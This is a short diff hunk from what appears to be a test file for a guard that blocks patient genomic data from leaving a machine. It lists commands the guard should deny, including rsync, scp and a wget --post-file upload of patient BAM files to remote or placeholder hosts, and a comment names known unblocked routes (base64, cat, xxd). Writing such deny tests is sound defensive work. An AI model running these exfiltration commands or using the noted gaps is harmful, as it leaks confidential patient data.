@@ -107,7 +107,7 @@ def run_tests() -> None:
         f"rsync {PD}/SAMPLE_A-ready.bam remote:/data/",
         f"scp {PD}/SAMPLE_A-ready.bam user@host:/tmp/",
         "curl -X POST https://api.github.com/repos/x/y/git/commits",
-        "wget --post-file=/home/ecovytis/patient_data/x.bam http://x/",
+        f"wget --post-file={PD}/x.bam http://x/",
         # Archive/compress writers are denied on a patient path. Note the
         # asymmetry with the KNOWN HOLES block below: `gzip -c` is denied
         # here, but `base64`/`cat`/`xxd` on the same file are not.
